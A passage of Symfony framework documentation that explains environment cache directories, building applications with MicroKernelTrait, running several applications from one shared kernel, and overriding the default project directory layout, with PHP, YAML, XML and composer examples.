``config/packages/ENVIRONMENT_NAME/``. You are free to implement this method
differently if you need a more sophisticated way of loading your configuration.

Environments and the Cache Directory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Symfony takes advantage of caching in many ways: the application configuration,
routing configuration, Twig templates and more are cached to PHP objects
stored in files on the filesystem.

By default, these cached files are largely stored in the ``var/cache/`` directory.
However, each environment caches its own set of files:

.. code-block:: text

    your-project/
    ├─ var/
    │  ├─ cache/
    │  │  ├─ dev/   # cache directory for the *dev* environment
    │  │  └─ prod/  # cache directory for the *prod* environment
    │  ├─ ...

Sometimes, when debugging, it may be helpful to inspect a cached file to
understand how something is working. When doing so, remember to look in
the directory of the environment you're using (most commonly ``dev/`` while
developing and debugging). While it can vary, the ``var/cache/dev/`` directory
includes the following:

``App_KernelDevDebugContainer.php``
    The cached "service container" that represents the cached application
    configuration.

``url_generating_routes.php``
    The cached routing configuration used when generating URLs.

``url_matching_routes.php``
    The cached configuration used for route matching - look here to see the compiled
    regular expression logic used to match incoming URLs to different routes.

``twig/``
    This directory contains all the cached Twig templates.

.. note::

    You can change the cache directory location and name. For more information
    read the article :doc:`/configuration/override_dir_structure`.

.. _`front controller`: https://en.wikipedia.org/wiki/Front_Controller_pattern
.. _`decorate`: https://en.wikipedia.org/wiki/Decorator_pattern
.. _Debug component: https://github.com/symfony/debug
Building your own Framework with the MicroKernelTrait
=====================================================

The default ``Kernel`` class included in Symfony applications uses a
:class:`Symfony\\Bundle\\FrameworkBundle\\Kernel\\MicroKernelTrait` to configure
the bundles, the routes and the service container in the same class.

This micro-kernel approach is flexible, allowing you to control your application
structure and features.

A Single-File Symfony Application
---------------------------------

Start with a completely empty directory and install these Symfony components
via Composer:

.. code-block:: terminal

    $ composer require symfony/config symfony/http-kernel \
      symfony/http-foundation symfony/routing \
      symfony/dependency-injection symfony/framework-bundle

Next, create an ``index.php`` file that defines the kernel class and runs it:

.. configuration-block::

    .. code-block:: php-attributes

        // index.php
        use Symfony\Bundle\FrameworkBundle\Kernel\MicroKernelTrait;
        use Symfony\Component\DependencyInjection\Loader\Configurator\ContainerConfigurator;
        use Symfony\Component\HttpFoundation\JsonResponse;
        use Symfony\Component\HttpFoundation\Request;
        use Symfony\Component\HttpKernel\Kernel as BaseKernel;
        use Symfony\Component\Routing\Attribute\Route;

        require __DIR__.'/vendor/autoload.php';

        class Kernel extends BaseKernel
        {
            use MicroKernelTrait;

            public function registerBundles(): array
            {
                return [
                    new Symfony\Bundle\FrameworkBundle\FrameworkBundle(),
                ];
            }

            protected function configureContainer(ContainerConfigurator $container): void
            {
                // PHP equivalent of config/packages/framework.yaml
                $container->extension('framework', [
                    'secret' => 'S0ME_SECRET'
                ]);
            }

            #[Route('/random/{limit}', name: 'random_number')]
            public function randomNumber(int $limit): JsonResponse
            {
                return new JsonResponse([
                    'number' => random_int(0, $limit),
                ]);
            }
        }

        $kernel = new Kernel('dev', true);
        $request = Request::createFromGlobals();
        $response = $kernel->handle($request);
        $response->send();
        $kernel->terminate($request, $response);

    .. code-block:: php

        // index.php
        use Symfony\Bundle\FrameworkBundle\Kernel\MicroKernelTrait;
        use Symfony\Component\DependencyInjection\Loader\Configurator\ContainerConfigurator;
        use Symfony\Component\HttpFoundation\JsonResponse;
        use Symfony\Component\HttpFoundation\Request;
        use Symfony\Component\HttpKernel\Kernel as BaseKernel;
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        require __DIR__.'/vendor/autoload.php';

        class Kernel extends BaseKernel
        {
            use MicroKernelTrait;

            public function registerBundles(): array
            {
                return [
                    new Symfony\Bundle\FrameworkBundle\FrameworkBundle(),
                ];
            }

            protected function configureContainer(ContainerConfigurator $container): void
            {
                // PHP equivalent of config/packages/framework.yaml
                $container->extension('framework', [
                    'secret' => 'S0ME_SECRET'
                ]);
            }

            protected function configureRoutes(RoutingConfigurator $routes): void
            {
                $routes->add('random_number', '/random/{limit}')->controller([$this, 'randomNumber']);
            }

            public function randomNumber(int $limit): JsonResponse
            {
                return new JsonResponse([
                    'number' => random_int(0, $limit),
                ]);
            }
        }

        $kernel = new Kernel('dev', true);
        $request = Request::createFromGlobals();
        $response = $kernel->handle($request);
        $response->send();
        $kernel->terminate($request, $response);

That's it! To test it, start the :doc:`Symfony Local Web Server
</setup/symfony_server>`:

.. code-block:: terminal

    $ symfony server:start

Then see the JSON response in your browser: http://localhost:8000/random/10

The Methods of a "Micro" Kernel
-------------------------------

When you use the ``MicroKernelTrait``, your kernel needs to have exactly three methods
that define your bundles, your services and your routes:

**registerBundles()**
    This is the same ``registerBundles()`` that you see in a normal kernel.

**configureContainer(ContainerConfigurator $container)**
    This method builds and configures the container. In practice, you will use
    ``extension()`` to configure different bundles (this is the equivalent
    of what you see in a normal ``config/packages/*`` file). You can also register
    services directly in PHP or load external configuration files (shown below).

**configureRoutes(RoutingConfigurator $routes)**
    Your job in this method is to add routes to the application. The
    ``RoutingConfigurator`` has methods that make adding routes in PHP more
    fun. You can also load external routing files (shown below).

Adding Interfaces to "Micro" Kernel
-----------------------------------

When using the ``MicroKernelTrait``, you can also implement the
``CompilerPassInterface`` to automatically register the kernel itself as a
compiler pass as explained in the dedicated
:ref:`compiler pass section <kernel-as-compiler-pass>`. If the
:class:`Symfony\\Component\\DependencyInjection\\Extension\\ExtensionInterface`
is implemented when using the ``MicroKernelTrait``, then the kernel will
be automatically registered as an extension. You can learn more about it in
the dedicated section about
:ref:`managing configuration with extensions <components-dependency-injection-extension>`.

It is also possible to implement the ``EventSubscriberInterface`` to handle
events directly from the kernel, again it will be registered automatically::

    // ...
    use App\Exception\Danger;
    use Symfony\Component\EventDispatcher\EventSubscriberInterface;
    use Symfony\Component\HttpKernel\Event\ExceptionEvent;
    use Symfony\Component\HttpKernel\KernelEvents;

    class Kernel extends BaseKernel implements EventSubscriberInterface
    {
        use MicroKernelTrait;

        // ...

        public function onKernelException(ExceptionEvent $event): void
        {
            if ($event->getThrowable() instanceof Danger) {
                $event->setResponse(new Response('It\'s dangerous to go alone. Take this ⚔'));
            }
        }

        public static function getSubscribedEvents(): array
        {
            return [
                KernelEvents::EXCEPTION => 'onKernelException',
            ];
        }
    }

Advanced Example: Twig, Annotations and the Web Debug Toolbar
-------------------------------------------------------------

The purpose of the ``MicroKernelTrait`` is *not* to have a single-file application.
Instead, its goal is to give you the power to choose your bundles and structure.

First, you'll probably want to put your PHP classes in an ``src/`` directory. Configure
your ``composer.json`` file to load from there:

.. code-block:: json

    {
        "require": {
            "...": "..."
        },
        "autoload": {
            "psr-4": {
                "App\\": "src/"
            }
        }
    }

Then, run ``composer dump-autoload`` to dump your new autoload config.

Now, suppose you want to define a custom configuration for your app,
use Twig and load routes via annotations. Instead of putting *everything*
in ``index.php``, create a new ``src/Kernel.php`` to hold the kernel.
Now it looks like this::

    // src/Kernel.php
    namespace App;

    use App\DependencyInjection\AppExtension;
    use Symfony\Bundle\FrameworkBundle\Kernel\MicroKernelTrait;
    use Symfony\Component\DependencyInjection\ContainerBuilder;
    use Symfony\Component\DependencyInjection\Loader\Configurator\ContainerConfigurator;
    use Symfony\Component\HttpKernel\Kernel as BaseKernel;
    use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

    class Kernel extends BaseKernel
    {
        use MicroKernelTrait;

        public function registerBundles(): array
        {
            $bundles = [
                new \Symfony\Bundle\FrameworkBundle\FrameworkBundle(),
                new \Symfony\Bundle\TwigBundle\TwigBundle(),
            ];

            if ('dev' === $this->getEnvironment()) {
                $bundles[] = new \Symfony\Bundle\WebProfilerBundle\WebProfilerBundle();
            }

            return $bundles;
        }

        protected function build(ContainerBuilder $containerBuilder): void
        {
            $containerBuilder->registerExtension(new AppExtension());
        }

        protected function configureContainer(ContainerConfigurator $container): void
        {
            $container->import(__DIR__.'/../config/framework.yaml');

            // register all classes in /src/ as service
            $container->services()
                ->load('App\\', __DIR__.'/*')
                ->autowire()
                ->autoconfigure()
            ;

            // configure WebProfilerBundle only if the bundle is enabled
            if (isset($this->bundles['WebProfilerBundle'])) {
                $container->extension('web_profiler', [
                    'toolbar' => true,
                    'intercept_redirects' => false,
                ]);
            }
        }

        protected function configureRoutes(RoutingConfigurator $routes): void
        {
            // import the WebProfilerRoutes, only if the bundle is enabled
            if (isset($this->bundles['WebProfilerBundle'])) {
                $routes->import('@WebProfilerBundle/Resources/config/routing/wdt.xml')->prefix('/_wdt');
                $routes->import('@WebProfilerBundle/Resources/config/routing/profiler.xml')->prefix('/_profiler');
            }

            // load the routes defined as PHP attributes
            // (use 'annotation' as the second argument if you define routes as annotations)
            $routes->import(__DIR__.'/Controller/', 'attribute');
        }

        // optional, to use the standard Symfony cache directory
        public function getCacheDir(): string
        {
            return __DIR__.'/../var/cache/'.$this->getEnvironment();
        }

        // optional, to use the standard Symfony logs directory
        public function getLogDir(): string
        {
            return __DIR__.'/../var/log';
        }
    }

Before continuing, run this command to add support for the new dependencies:

.. code-block:: terminal

    $ composer require symfony/yaml symfony/twig-bundle symfony/web-profiler-bundle

Next, create a new extension class that defines your app configuration and
add a service conditionally based on the ``foo`` value::

    // src/DependencyInjection/AppExtension.php
    namespace App\DependencyInjection;

    use Symfony\Component\Config\Definition\Configurator\DefinitionConfigurator;
    use Symfony\Component\DependencyInjection\ContainerBuilder;
    use Symfony\Component\DependencyInjection\Extension\AbstractExtension;
    use Symfony\Component\DependencyInjection\Loader\Configurator\ContainerConfigurator;

    class AppExtension extends AbstractExtension
    {
        public function configure(DefinitionConfigurator $definition): void
        {
            $definition->rootNode()
                ->children()
                    ->booleanNode('foo')->defaultTrue()->end()
                ->end();
        }

        public function loadExtension(array $config, ContainerConfigurator $containerConfigurator, ContainerBuilder $containerBuilder): void
        {
            if ($config['foo']) {
                $containerBuilder->register('foo_service', \stdClass::class);
            }
        }
    }

Unlike the previous kernel, this loads an external ``config/framework.yaml`` file,
because the configuration started to get bigger:

.. configuration-block::

    .. code-block:: yaml

        # config/framework.yaml
        framework:
            secret: S0ME_SECRET
            profiler: { only_exceptions: false }

    .. code-block:: xml

        <!-- config/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config secret="S0ME_SECRET">
                <framework:profiler only-exceptions="false"/>
            </framework:config>
        </container>

    .. code-block:: php

        // config/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework
                ->secret('SOME_SECRET')
                ->profiler()
                    ->onlyExceptions(false)
            ;
        };

This also loads attribute routes from an ``src/Controller/`` directory, which
has one file in it::

    // src/Controller/MicroController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing\Attribute\Route;

    class MicroController extends AbstractController
    {
        #[Route('/random/{limit}')]
        public function randomNumber(int $limit): Response
        {
            $number = random_int(0, $limit);

            return $this->render('micro/random.html.twig', [
                'number' => $number,
            ]);
        }
    }

Template files should live in the ``templates/`` directory at the root of your project.
This template lives at ``templates/micro/random.html.twig``:

.. code-block:: html+twig

    <!-- templates/micro/random.html.twig -->
    <!DOCTYPE html>
    <html>
        <head>
            <title>Random action</title>
        </head>
        <body>
            <p>{{ number }}</p>
        </body>
    </html>

Finally, you need a front controller to boot and run the application. Create a
``public/index.php``::

    // public/index.php
    use App\Kernel;
    use Symfony\Component\HttpFoundation\Request;

    require __DIR__.'/../vendor/autoload.php';

    $kernel = new Kernel('dev', true);
    $request = Request::createFromGlobals();
    $response = $kernel->handle($request);
    $response->send();
    $kernel->terminate($request, $response);

That's it! This ``/random/10`` URL will work, Twig will render, and you'll even
get the web debug toolbar to show up at the bottom. The final structure looks like
this:

.. code-block:: text

    your-project/
    ├─ config/
    │  └─ framework.yaml
    ├─ public/
    |  └─ index.php
    ├─ src/
    |  ├─ Controller
    |  |  └─ MicroController.php
    |  └─ Kernel.php
    ├─ templates/
    |  └─ micro/
    |     └─ random.html.twig
    ├─ var/
    |  ├─ cache/
    │  └─ log/
    ├─ vendor/
    │  └─ ...
    ├─ composer.json
    └─ composer.lock

As before you can use the :doc:`Symfony Local Web Server
</setup/symfony_server>`:

.. code-block:: terminal

    $ symfony server:start

Then visit the page in your browser: http://localhost:8000/random/10
How to Create Multiple Symfony Applications with a Single Kernel
================================================================

In Symfony applications, incoming requests are usually processed by the front
controller at ``public/index.php``, which instantiates the ``src/Kernel.php``
class to create the application kernel. This kernel loads the bundles, the
configuration, and handles the request to generate the response.

The current implementation of the Kernel class serves as a convenient default
for a single application. However, it can also manage multiple applications.
While the Kernel typically runs the same application with different
configurations based on various :ref:`environments <configuration-environments>`,
it can be adapted to run different applications with specific bundles and configuration.

These are some of the common use cases for creating multiple applications with a
single Kernel:

* An application that defines an API can be divided into two segments to improve
  performance. The first segment serves the regular web application, while the
  second segment exclusively responds to API requests. This approach requires
  loading fewer bundles and enabling fewer features for the second part, thus
  optimizing performance;
* A highly sensitive application could be divided into two parts for enhanced
  security. The first part would only load routes corresponding to the publicly
  exposed sections of the application. The second part would load the remainder
  of the application, with its access safeguarded by the web server;
* A monolithic application could be gradually transformed into a more
  distributed architecture, such as micro-services. This approach allows for a
  seamless migration of a large application while still sharing common
  configurations and components.

Turning a Single Application into Multiple Applications
-------------------------------------------------------

These are the steps required to convert a single application into a new one that
supports multiple applications:

1. Create a new application;
2. Update the Kernel class to support multiple applications;
3. Add a new ``APP_ID`` environment variable;
4. Update the front controllers.

The following example shows how to create a new application for the API of a new
Symfony project.

Step 1) Create a new Application
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This example follows the `Shared Kernel`_ pattern: all applications maintain an
isolated context, but they can share common bundles, configuration, and code if
desired. The optimal approach will depend on your specific needs and
requirements, so it's up to you to decide which best suits your project.

First, create a new ``apps`` directory at the root of your project, which will
hold all the necessary applications. Each application will follow a simplified
directory structure like the one described in :doc:`Symfony Best Practice </best_practices>`:

.. code-block:: text

    your-project/
    ├─ apps/
    │  └─ api/
    │     ├─ config/
    │     │  ├─ bundles.php
    │     │  ├─ routes.yaml
    │     │  └─ services.yaml
    │     └─ src/
    ├─ bin/
    │  └─ console
    ├─ config/
    ├─ public/
    │  └─ index.php
    ├─ src/
    │  └─ Kernel.php

.. note::

    Note that the ``config/`` and ``src/`` directories at the root of the
    project will represent the shared context among all applications within the
    ``apps/`` directory. Therefore, you should carefully consider what is
    common and what should be placed in the specific application.

.. tip::

    You might also consider renaming the namespace for the shared context, from
    ``App`` to ``Shared``, as it will make it easier to distinguish and provide
    clearer meaning to this context.

Since the new ``apps/api/src/`` directory will host the PHP code related to the
API, you have to update the ``composer.json`` file to include it in the autoload
section:

.. code-block:: json

    {
        "autoload": {
            "psr-4": {
                "Shared\\": "src/",
                "Api\\": "apps/api/src/"
            }
        }
    }

Additionally, don't forget to run ``composer dump-autoload`` to generate the
autoload files.

Step 2) Update the Kernel class to support Multiple Applications
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Since there will be multiple applications, it's better to add a new property
``string $id`` to the Kernel to identify the application being loaded. This
property will also allow you to split the cache, logs, and configuration files
in order to avoid collisions with other applications. Moreover, it contributes
to performance optimization, as each application will load only the required
resources::

    // src/Kernel.php
    namespace Shared;

    use Symfony\Component\DependencyInjection\Loader\Configurator\ContainerConfigurator;
    use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

    class Kernel extends BaseKernel
    {
        use MicroKernelTrait;

        public function __construct(string $environment, bool $debug, private string $id)
        {
            parent::__construct($environment, $debug);
        }

        public function getSharedConfigDir(): string
        {
            return $this->getProjectDir().'/config';
        }

        public function getAppConfigDir(): string
        {
            return $this->getProjectDir().'/apps/'.$this->id.'/config';
        }

        public function registerBundles(): iterable
        {
            $sharedBundles = require $this->getSharedConfigDir().'/bundles.php';
            $appBundles = require $this->getAppConfigDir().'/bundles.php';

            // load common bundles, such as the FrameworkBundle, as well as
            // specific bundles required exclusively for the app itself
            foreach (array_merge($sharedBundles, $appBundles) as $class => $envs) {
                if ($envs[$this->environment] ?? $envs['all'] ?? false) {
                    yield new $class();
                }
            }
        }

        public function getCacheDir(): string
        {
            // divide cache for each application
            return ($_SERVER['APP_CACHE_DIR'] ?? $this->getProjectDir().'/var/cache').'/'.$this->id.'/'.$this->environment;
        }

        public function getLogDir(): string
        {
            // divide logs for each application
            return ($_SERVER['APP_LOG_DIR'] ?? $this->getProjectDir().'/var/log').'/'.$this->id;
        }

        protected function configureContainer(ContainerConfigurator $container): void
        {
            // load common config files, such as the framework.yaml, as well as
            // specific configs required exclusively for the app itself
            $this->doConfigureContainer($container, $this->getSharedConfigDir());
            $this->doConfigureContainer($container, $this->getAppConfigDir());
        }

        protected function configureRoutes(RoutingConfigurator $routes): void
        {
            // load common routes files, such as the routes/framework.yaml, as well as
            // specific routes required exclusively for the app itself
            $this->doConfigureRoutes($routes, $this->getSharedConfigDir());
            $this->doConfigureRoutes($routes, $this->getAppConfigDir());
        }

        private function doConfigureContainer(ContainerConfigurator $container, string $configDir): void
        {
            $container->import($configDir.'/{packages}/*.{php,yaml}');
            $container->import($configDir.'/{packages}/'.$this->environment.'/*.{php,yaml}');

            if (is_file($configDir.'/services.yaml')) {
                $container->import($configDir.'/services.yaml');
                $container->import($configDir.'/{services}_'.$this->environment.'.yaml');
            } else {
                $container->import($configDir.'/{services}.php');
            }
        }

        private function doConfigureRoutes(RoutingConfigurator $routes, string $configDir): void
        {
            $routes->import($configDir.'/{routes}/'.$this->environment.'/*.{php,yaml}');
            $routes->import($configDir.'/{routes}/*.{php,yaml}');

            if (is_file($configDir.'/routes.yaml')) {
                $routes->import($configDir.'/routes.yaml');
            } else {
                $routes->import($configDir.'/{routes}.php');
            }

            if (false !== ($fileName = (new \ReflectionObject($this))->getFileName())) {
                $routes->import($fileName, 'attribute');
            }
        }
    }

This example reuses the default implementation to import the configuration and
routes based on a given configuration directory. As shown earlier, this
approach will import both the shared and the app-specific resources.

Step 3) Add a new APP_ID environment variable
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Next, define a new environment variable that identifies the current application.
This new variable can be added to the ``.env`` file to provide a default value,
but it should typically be added to your web server configuration.

.. code-block:: bash

    # .env
    APP_ID=api

.. caution::

    The value of this variable must match the application directory within
    ``apps/`` as it is used in the Kernel to load the specific application
    configuration.

Step 4) Update the Front Controllers
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In this final step, update the front controllers ``public/index.php`` and
``bin/console`` to pass the value of the ``APP_ID`` variable to the Kernel
instance. This will allow the Kernel to load and run the specified
application::

    // public/index.php
    use Shared\Kernel;
    // ...

    return function (array $context): Kernel {
        return new Kernel($context['APP_ENV'], (bool) $context['APP_DEBUG'], $context['APP_ID']);
    };

Similar to configuring the required ``APP_ENV`` and ``APP_DEBUG`` values, the
third argument of the Kernel constructor is now also necessary to set the
application ID, which is derived from an external configuration.

For the second front controller, define a new console option to allow passing
the application ID to run under CLI context::

    // bin/console
    use Shared\Kernel;
    use Symfony\Component\Console\Input\InputInterface;
    use Symfony\Component\Console\Input\InputOption;

    return function (InputInterface $input, array $context): Application {
        $kernel = new Kernel($context['APP_ENV'], (bool) $context['APP_DEBUG'], $input->getParameterOption(['--id', '-i'], $context['APP_ID']));

        $application = new Application($kernel);
        $application->getDefinition()
            ->addOption(new InputOption('--id', '-i', InputOption::VALUE_REQUIRED, 'The App ID'))
        ;

        return $application;
    };

That's it!

Executing Commands
------------------

The ``bin/console`` script, which is used to run Symfony commands, always uses
the ``Kernel`` class to build the application and load the commands. If you
need to run console commands for a specific application, you can provide the
``--id`` option along with the appropriate identity value:

.. code-block:: terminal

    php bin/console cache:clear --id=api
    // or
    php bin/console cache:clear -iapi

    // alternatively
    export APP_ID=api
    php bin/console cache:clear

You might want to update the composer auto-scripts section to run multiple
commands simultaneously. This example shows the commands of two different
applications called ``api`` and ``admin``:

.. code-block:: json

    {
        "scripts": {
            "auto-scripts": {
                "cache:clear -iapi": "symfony-cmd",
                "cache:clear -iadmin": "symfony-cmd",
                "assets:install %PUBLIC_DIR% -iapi": "symfony-cmd",
                "assets:install %PUBLIC_DIR% -iadmin --no-cleanup": "symfony-cmd"
            }
        }
    }

Then, run ``composer auto-scripts`` to test it!

.. note::

    The commands available for each console script (e.g. ``bin/console -iapi``
    and ``bin/console -iadmin``) can differ because they depend on the bundles
    enabled for each application, which could be different.

Rendering Templates
-------------------

Let's consider that you need to create another app called ``admin``. If you
follow the :doc:`Symfony Best Practices </best_practices>`, the shared Kernel
templates will be located in the ``templates/`` directory at the project's root.
For admin-specific templates, you can create a new directory
``apps/admin/templates/`` which you will need to manually configure under the
Admin application:

.. code-block:: yaml

    # apps/admin/config/packages/twig.yaml
    twig:
        paths:
            '%kernel.project_dir%/apps/admin/templates': Admin

Then, use this Twig namespace to reference any template within the Admin
application only, for example ``@Admin/form/fields.html.twig``.

Running Tests
-------------

In Symfony applications, functional tests typically extend from
the :class:`Symfony\\Bundle\\FrameworkBundle\\Test\\WebTestCase` class by
default. Within its parent class, ``KernelTestCase``, there is a method called
``createKernel()`` that attempts to create the kernel responsible for running
the application during tests. However, the current logic of this method doesn't
include the new application ID argument, so you need to update it::

    // apps/api/tests/ApiTestCase.php
    namespace Api\Tests;

    use Shared\Kernel;
    use Symfony\Bundle\FrameworkBundle\Test\WebTestCase;
    use Symfony\Component\HttpKernel\KernelInterface;

    class ApiTestCase extends WebTestCase
    {
        protected static function createKernel(array $options = []): KernelInterface
        {
            $env = $options['environment'] ?? $_ENV['APP_ENV'] ?? $_SERVER['APP_ENV'] ?? 'test';
            $debug = $options['debug'] ?? (bool) ($_ENV['APP_DEBUG'] ?? $_SERVER['APP_DEBUG'] ?? true);

            return new Kernel($env, $debug, 'api');
        }
    }

.. note::

    This examples uses a hardcoded application ID value because the tests
    extending this ``ApiTestCase`` class will focus solely on the ``api`` tests.

Now, create a ``tests/`` directory inside the ``apps/api/`` application. Then,
update both the ``composer.json`` file and ``phpunit.xml`` configuration about
its existence:

.. code-block:: json

    {
        "autoload-dev": {
            "psr-4": {
                "Shared\\Tests\\": "tests/",
                "Api\\Tests\\": "apps/api/tests/"
            }
        }
    }

Remember to run ``composer dump-autoload`` to generate the autoload files.

And, here is the update needed for the ``phpunit.xml`` file:

.. code-block:: xml

    <testsuites>
        <testsuite name="shared">
            <directory>tests</directory>
        </testsuite>
        <testsuite name="api">
            <directory>apps/api/tests</directory>
        </testsuite>
    </testsuites>

Adding more Applications
------------------------

Now you can begin adding more applications as needed, such as an ``admin``
application to manage the project's configuration and permissions. To do that,
you will have to repeat the step 1 only:

.. code-block:: text

    your-project/
    ├─ apps/
    │  ├─ admin/
    │  │  ├─ config/
    │  │  │  ├─ bundles.php
    │  │  │  ├─ routes.yaml
    │  │  │  └─ services.yaml
    │  │  └─ src/
    │  └─ api/
    │     └─ ...

Additionally, you might need to update your web server configuration to set the
``APP_ID=admin`` under a different domain.

.. _`Shared Kernel`: http://ddd.fed.wiki.org/view/shared-kernel
How to Override Symfony's default Directory Structure
=====================================================

Symfony applications have the following default directory structure, but you can
override it to create your own structure:

.. code-block:: text

    your-project/
    ├─ assets/
    ├─ bin/
    │  └─ console
    ├─ config/
    ├─ public/
    │  └─ index.php
    ├─ src/
    │  └─ ...
    ├─ templates/
    ├─ tests/
    ├─ translations/
    ├─ var/
    │  ├─ cache/
    │  ├─ log/
    │  └─ ...
    ├─ vendor/
    └─ .env

.. _override-env-dir:

Override the Environment (DotEnv) Files Directory
-------------------------------------------------

By default, the :ref:`.env configuration file <config-dot-env>` is located at
the root directory of the project. If you store it in a different location,
define the ``runtime.dotenv_path`` option in the ``composer.json`` file:

.. code-block:: json

    {
        "...": "...",
        "extra": {
            "...": "...",
            "runtime": {
                "dotenv_path": "my/custom/path/to/.env"
            }
        }
    }

Then, update your Composer files (running ``composer dump-autoload``, for instance),
so that the ``vendor/autoload_runtime.php`` files gets regenerated with the new
``.env`` path.

You can also set up different ``.env`` paths for your console and web server
calls. Edit the ``public/index.php`` and/or ``bin/console`` files to define the
new file path.

Console script::

    // bin/console

    // ...
    $_SERVER['APP_RUNTIME_OPTIONS']['dotenv_path'] = 'some/custom/path/to/.env';

    require_once dirname(__DIR__).'/vendor/autoload_runtime.php';
    // ...

Web front-controller::

    // public/index.php

    // ...
    $_SERVER['APP_RUNTIME_OPTIONS']['dotenv_path'] = 'another/custom/path/to/.env';

    require_once dirname(__DIR__).'/vendor/autoload_runtime.php';
    // ...

.. _override-config-dir:

Override the Configuration Directory
------------------------------------

The configuration directory is the only one which cannot be overridden in a
Symfony application. Its location is hardcoded as the ``config/`` directory
at your project root directory.

.. _override-cache-dir:

Override the Cache Directory
----------------------------

Changing the cache directory can be achieved by overriding the
``getCacheDir()`` method in the ``Kernel`` class of your application::

    // src/Kernel.php

    // ...
    class Kernel extends BaseKernel
    {
        // ...

        public function getCacheDir(): string
        {
            return dirname(__DIR__).'/var/'.$this->environment.'/cache';
        }
    }

In this code, ``$this->environment`` is the current environment (i.e. ``dev``).
In this case you have changed the location of the cache directory to
``var/{environment}/cache/``.

You can also change the cache directory by defining an environment variable
named ``APP_CACHE_DIR`` whose value is the full path of the cache folder.

.. caution::

    You should keep the cache directory different for each environment,
    otherwise some unexpected behavior may happen. Each environment generates
    its own cached configuration files, and so each needs its own directory to
    store those cache files.

.. _override-logs-dir:

Override the Log Directory
--------------------------

Overriding the ``var/log/`` directory is almost the same as overriding the
``var/cache/`` directory.

You can do it overriding the ``getLogDir()`` method in the ``Kernel`` class of
your application::

    // src/Kernel.php

    // ...
    class Kernel extends BaseKernel
    {
        // ...

        public function getLogDir(): string
        {
            return dirname(__DIR__).'/var/'.$this->environment.'/log';
        }
    }

Here you have changed the location of the directory to ``var/{environment}/log/``.

You can also change the log directory defining an environment variable named
``APP_LOG_DIR`` whose value is the full path of the log folder.

.. _override-templates-dir:

Override the Templates Directory
--------------------------------

If your templates are not stored in the default ``templates/`` directory, use
the :ref:`twig.default_path <config-twig-default-path>` configuration
option to define your own templates directory (use :ref:`twig.paths <config-twig-paths>`
for multiple directories):

.. configuration-block::

    .. code-block:: yaml

        # config/packages/twig.yaml
        twig:
            # ...
            default_path: "%kernel.project_dir%/resources/views"

    .. code-block:: xml

        <!-- config/packages/twig.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:twig="http://symfony.com/schema/dic/twig"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/twig
                https://symfony.com/schema/dic/twig/twig-1.0.xsd">

            <twig:config>
                <twig:default-path>%kernel.project_dir%/resources/views</twig:default-path>
            </twig:config>

        </container>

    .. code-block:: php

        // config/packages/twig.php
        use Symfony\Config\TwigConfig;

        return static function (TwigConfig $twig): void {
            $twig->defaultPath('%kernel.project_dir%/resources/views');
        };

Override the Translations Directory
-----------------------------------

If your translation files are not stored in the default ``translations/``
directory, use the :ref:`framework.translator.default_path <reference-translator-default_path>`
configuration option to define your own translations directory (use :ref:`framework.translator.paths <reference-translator-paths>` for multiple directories):

.. configuration-block::

    .. code-block:: yaml

        # config/packages/translation.yaml
        framework:
            translator:
                # ...
                default_path: "%kernel.project_dir%/i18n"

    .. code-block:: xml

        <!-- config/packages/translation.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:twig="http://symfony.com/schema/dic/twig"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/twig
                https://symfony.com/schema/dic/twig/twig-1.0.xsd">

            <framework:config>
                <framework:translator>
                    <framework:default-path>%kernel.project_dir%/i18n</framework:default-path>
                </framework:translator>
            </framework:config>

        </container>

    .. code-block:: php

        // config/packages/translation.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->translator()
                ->defaultPath('%kernel.project_dir%/i18n')
            ;
        };

.. _override-web-dir:
.. _override-the-web-directory:

Override the Public Directory
-----------------------------

If you need to rename or move your ``public/`` directory, the only thing you
need to guarantee is that the path to the ``vendor/`` directory is still correct in
your ``index.php`` front controller. If you renamed the directory, you're fine.
But if you moved it in some way, you may need to modify these paths inside those
files::

    require_once __DIR__.'/../path/to/vendor/autoload_runtime.php';

You also need to change the ``extra.public-dir`` option in the ``composer.json``
file:

.. code-block:: json

    {
        "...": "...",
        "extra": {
            "...": "...",
            "public-dir": "my_new_public_dir"
        }
    }

.. tip::

    Some shared hosts have a ``public_html/`` web directory root. Renaming
    your web directory from ``public/`` to ``public_html/`` is one way to make
    your Symfony project work on your shared host. Another way is to deploy
    your application to a directory outside of your web root, delete your
    ``public_html/`` directory, and then replace it with a symbolic link to
    the ``public/`` dir in your project.

Override the Vendor Directory
-----------------------------

To override the ``vendor/`` directory, you need to define the ``vendor-dir``
option in your ``composer.json`` file like this:

.. code-block:: json

    {
        "config": {
            "bin-dir": "bin",
            "vendor-dir": "/some/dir/vendor"
        }
    }

.. tip::

